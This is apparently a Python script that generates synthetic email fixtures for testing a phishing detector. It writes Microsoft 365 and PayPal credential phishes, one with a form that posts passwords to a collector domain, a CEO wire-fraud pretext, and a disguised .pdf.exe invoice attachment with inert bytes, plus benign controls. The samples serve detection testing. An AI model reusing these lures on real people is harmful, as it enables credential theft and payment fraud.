#!/usr/bin/env python3
"""Generate the sample corpus used by the tests and the README walkthrough.

Every message here is synthetic. The domains are RFC 2606 / RFC 6761 reserved
names or obvious fakes, the "payloads" are inert text, and nothing resolves.
The point is to exercise the detection rules end to end without shipping real
malicious mail into a public repository.

Run ``python3 samples/make_samples.py`` to regenerate ``samples/*.eml``.
"""

from __future__ import annotations

import base64
import os

HERE = os.path.dirname(os.path.abspath(__file__))


def write(name: str, content: str) -> None:
    """Write one sample with RFC 5322 CRLF line endings.

    ``newline="\\r\\n"`` translates every ``\\n`` on the way out, so the content
    must use bare newlines here — appending a literal ``\\r\\n`` would be
    translated a second time into ``\\r\\r\\n``.
    """
    path = os.path.join(HERE, name)
    with open(path, "w", encoding="utf-8", newline="\r\n") as handle:
        handle.write(content.strip() + "\n")
    print(f"wrote {name}")


# --------------------------------------------------------------------------- #
# 1. Credential phishing — Microsoft 365 impersonation
# --------------------------------------------------------------------------- #

CREDENTIAL_PHISH = """
Return-Path: <bounce@mail-delivery-svc.top>
Received: from mail-delivery-svc.top (unknown [45.132.19.204])
 by mx.example.com (Postfix) with ESMTP id 8A21C4F2
 for <finance@example.com>; Tue, 12 Aug 2025 03:14:22 -0700 (PDT)
Received: from WIN-KJ3D9A (localhost [127.0.0.1])
 by mail-delivery-svc.top with SMTP id 4B7E1
 for <finance@example.com>; Tue, 12 Aug 2025 03:14:18 -0700 (PDT)
Authentication-Results: mx.example.com;
 spf=fail (sender IP is 45.132.19.204) smtp.mailfrom=mail-delivery-svc.top;
 dkim=none header.d=none;
 dmarc=fail action=quarantine header.from=micros0ft-support.com
Received-SPF: fail (mx.example.com: domain of mail-delivery-svc.top does not designate 45.132.19.204 as permitted sender)
From: "Microsoft 365 Security" <no-reply@micros0ft-support.com>
Reply-To: <recovery-desk@secure-mail-verify.xyz>
To: <finance@example.com>
Subject: Action required: unusual sign-in activity on your account
Date: Tue, 12 Aug 2025 03:14:15 -0700
Message-ID: <20250812101415.4B7E1@mail-delivery-svc.top>
X-Mailer: PHPMailer 6.8.0 (https://github.com/PHPMailer/PHPMailer)
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="=_bnd_9a12f"

--=_bnd_9a12f
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 7bit

Dear Customer,

We detected an unauthorized login attempt on your Microsoft 365 account from
an unrecognized device. For your protection, your account will be suspended
within 24 hours unless you verify your identity immediately.

Please confirm your account here: https://login.microsoftonline.com.verify-session.top/auth?u=finance@example.com

Failure to comply will result in permanent loss of access to your mailbox.

Microsoft 365 Security Team

--=_bnd_9a12f
Content-Type: text/html; charset="utf-8"
Content-Transfer-Encoding: 7bit

<html><body style="font-family:Segoe UI,sans-serif">
<p>Dear Customer,</p>
<p>We detected an <b>unauthorized login attempt</b> on your Microsoft 365 account.
Your account will be suspended within 24 hours unless you verify your identity
immediately.</p>
<p><a href="https://login.microsoftonline.com.verify-session.top/auth?u=finance@example.com">https://login.microsoftonline.com/verify</a></p>
<p>Alternatively, sign in below:</p>
<form action="https://collector.secure-mail-verify.xyz/post.php" method="post">
  <input type="text" name="email" placeholder="Email">
  <input type="password" name="pass" placeholder="Password">
  <input type="submit" value="Verify account">
</form>
<p style="font-size:0;color:#ffffff;background:#ffffff">newsletter unsubscribe preferences account settings billing statement</p>
<p>Microsoft 365 Security Team</p>
</body></html>

--=_bnd_9a12f--
"""

# --------------------------------------------------------------------------- #
# 2. Business email compromise — CEO gift-card / wire pretext
# --------------------------------------------------------------------------- #

BEC = """
Return-Path: <danielroth.ceo88@gmail.com>
Received: from mail-wr1-f52.google.com (mail-wr1-f52.google.com [209.85.221.52])
 by mx.example.com (Postfix) with ESMTPS id 1F3B72A9
 for <ap@example.com>; Wed, 13 Aug 2025 07:02:11 -0400 (EDT)
Authentication-Results: mx.example.com;
 spf=pass smtp.mailfrom=gmail.com;
 dkim=pass header.d=gmail.com;
 dmarc=pass header.from=gmail.com
From: "Daniel Roth | CEO" <danielroth.ceo88@gmail.com>
Reply-To: <d.roth.finance@outlook.com>
To: <ap@example.com>
Subject: Re: Quick request
Date: Wed, 13 Aug 2025 07:02:05 -0400
Message-ID: <CAF9x2mZ8Q@mail.gmail.com>
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"

Hi,

Are you available? I'm currently in a meeting and can't take calls.

I need you to process an urgent wire transfer to a new vendor today. The
banking details have changed since last time — updated payment details are
below. Please keep this between us until the announcement goes out.

Let me know once it's done.

Daniel

Sent from my iPhone
"""

# --------------------------------------------------------------------------- #
# 3. Malware delivery — invoice with a deceptive attachment
# --------------------------------------------------------------------------- #

_FAKE_PAYLOAD = base64.b64encode(
    b"MZ\x90\x00INERT-SAMPLE-NOT-A-REAL-EXECUTABLE-phishhawk-test-fixture\x00" * 12
).decode()
_WRAPPED = "\n".join(_FAKE_PAYLOAD[i:i + 76] for i in range(0, len(_FAKE_PAYLOAD), 76))

MALWARE = f"""
Return-Path: <billing@invoice-dispatch.click>
Received: from vps-7742.hosting-cheap.ru (vps-7742.hosting-cheap.ru [185.220.101.44])
 by mx.example.com (Postfix) with ESMTP id C09E13B1
 for <accounts@example.com>; Thu, 14 Aug 2025 22:48:03 +0000 (UTC)
Authentication-Results: mx.example.com;
 spf=softfail smtp.mailfrom=invoice-dispatch.click;
 dkim=fail header.d=invoice-dispatch.click;
 dmarc=fail header.from=invoice-dispatch.click
From: "Accounts Payable" <billing@invoice-dispatch.click>
To: <accounts@example.com>
Subject: Fwd: Outstanding invoice INV-88213 - final notice
Date: Thu, 14 Aug 2025 22:48:00 +0000
Message-ID: <a91bc2@invoice-dispatch.click>
X-Mailer: Python smtplib
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="=_mix_31ff"

--=_mix_31ff
Content-Type: text/plain; charset="utf-8"

Please find the attached invoice. This is a final notice — payment is overdue
and legal action will follow if we do not receive remittance within 48 hours.

Open the attached statement for the payment instructions.

Accounts Payable

--=_mix_31ff
Content-Type: application/octet-stream; name="Invoice_88213.pdf.exe"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="Invoice_88213.pdf.exe"

{_WRAPPED}

--=_mix_31ff
Content-Type: text/html; name="payment_portal.html"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="payment_portal.html"

PGh0bWw+PGJvZHk+SU5FUlQgVEVTVCBGSVhUVVJFIC0gbm90IGEgcmVhbCBwaGlzaGluZyBwYWdlPC9ib2R5PjwvaHRtbD4=

--=_mix_31ff--
"""

# --------------------------------------------------------------------------- #
# 4. Legitimate transactional mail — must score BENIGN
# --------------------------------------------------------------------------- #

LEGITIMATE = """
Return-Path: <bounce-3391@notifications.github.com>
Received: from out-24.smtp.github.com (out-24.smtp.github.com [192.30.252.204])
 by mx.example.com (Postfix) with ESMTPS id 55D9A118
 for <dev@example.com>; Mon, 11 Aug 2025 09:31:47 +0000 (UTC)
Authentication-Results: mx.example.com;
 spf=pass smtp.mailfrom=notifications.github.com;
 dkim=pass header.d=github.com;
 dmarc=pass header.from=github.com
From: "GitHub" <notifications@github.com>
To: <dev@example.com>
Subject: [example/repo] Pull request #142 was merged
Date: Mon, 11 Aug 2025 09:31:45 +0000
Message-ID: <example/repo/pull/142@github.com>
List-Id: example/repo <repo.example.github.com>
List-Unsubscribe: <https://github.com/notifications/unsubscribe/ABC123>
Precedence: list
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"

@octocat merged pull request #142 into main.

View it on GitHub:
https://github.com/example/repo/pull/142

You are receiving this because you were mentioned.
Reply to this email directly, or unsubscribe:
https://github.com/notifications/unsubscribe/ABC123
"""

# --------------------------------------------------------------------------- #
# 5. Legitimate marketing mail — trips content rules, must stay low
# --------------------------------------------------------------------------- #

NEWSLETTER = """
Return-Path: <bounce@mail.retailer-example.com>
Received: from mta-42.mail.retailer-example.com (mta-42.mail.retailer-example.com [198.51.100.42])
 by mx.example.com (Postfix) with ESMTPS id 77C31DD4
 for <shopper@example.com>; Fri, 15 Aug 2025 06:00:12 +0000 (UTC)
Authentication-Results: mx.example.com;
 spf=pass smtp.mailfrom=mail.retailer-example.com;
 dkim=pass header.d=retailer-example.com;
 dmarc=pass header.from=retailer-example.com
From: "Retailer Example" <deals@retailer-example.com>
To: <shopper@example.com>
Subject: Last chance! Summer sale ends today
Date: Fri, 15 Aug 2025 06:00:10 +0000
Message-ID: <camp-99812@mail.retailer-example.com>
List-Unsubscribe: <https://retailer-example.com/unsubscribe?id=99812>
List-Id: Retailer Example Deals <deals.retailer-example.com>
Precedence: bulk
X-Campaign-Id: summer-2025-final
MIME-Version: 1.0
Content-Type: text/html; charset="utf-8"

<html><body>
<h1>Last chance — the summer sale ends today!</h1>
<p>Dear Customer, act now before these deals expire today at midnight.</p>
<p><a href="https://retailer-example.com/sale/summer">Shop the sale</a></p>
<p><a href="https://retailer-example.com/account">Your account</a> ·
<a href="https://retailer-example.com/unsubscribe?id=99812">Unsubscribe</a></p>
</body></html>
"""

# --------------------------------------------------------------------------- #
# 6. Homograph / punycode credential phish with a shortener
# --------------------------------------------------------------------------- #

HOMOGRAPH = """
Return-Path: <alerts@xn--pypal-4ve.com>
Received: from relay.bulk-sender.gq (relay.bulk-sender.gq [91.219.236.18])
 by mx.example.com (Postfix) with ESMTP id 3EE0A992
 for <user@example.com>; Sat, 16 Aug 2025 11:20:44 +0000 (UTC)
Authentication-Results: mx.example.com;
 spf=fail smtp.mailfrom=xn--pypal-4ve.com;
 dmarc=fail header.from=xn--pypal-4ve.com
From: "PayPal Service" <alerts@xn--pypal-4ve.com>
To: undisclosed-recipients:;
Subject: Your account has been limited
Date: Sat, 16 Aug 2025 11:20:40 +0000
Message-ID: <99182773@relay.bulk-sender.gq>
MIME-Version: 1.0
Content-Type: text/html; charset="utf-8"

<html><body>
<p>Dear valued customer,</p>
<p>We have detected unusual activity on your account. Your access has been
restricted as a precaution. You must confirm your identity within 48 hours or
your account will be permanently closed.</p>
<p><a href="https://bit.ly/3xKq9Zp">https://www.paypal.com/signin</a></p>
<p><a href="http://192.0.2.77:8080/paypal/login/verify.php?email=user@example.com">Restore access</a></p>
<p><a href="https://accounts-paypal.firebaseapp.com/secure/update">Alternative link</a></p>
<img src="https://tracker.bulk-sender.gq/o.gif?id=99182773" width="1" height="1">
</body></html>
"""

SAMPLES = {
    "01_credential_phish_m365.eml": CREDENTIAL_PHISH,
    "02_bec_ceo_wire_fraud.eml": BEC,
    "03_malware_invoice.eml": MALWARE,
    "04_legitimate_github.eml": LEGITIMATE,
    "05_legitimate_newsletter.eml": NEWSLETTER,
    "06_homograph_paypal.eml": HOMOGRAPH,
}


def main() -> None:
    for name, content in SAMPLES.items():
        write(name, content)
    print(f"\n{len(SAMPLES)} sample messages written to {HERE}")


if __name__ == "__main__":
    main()
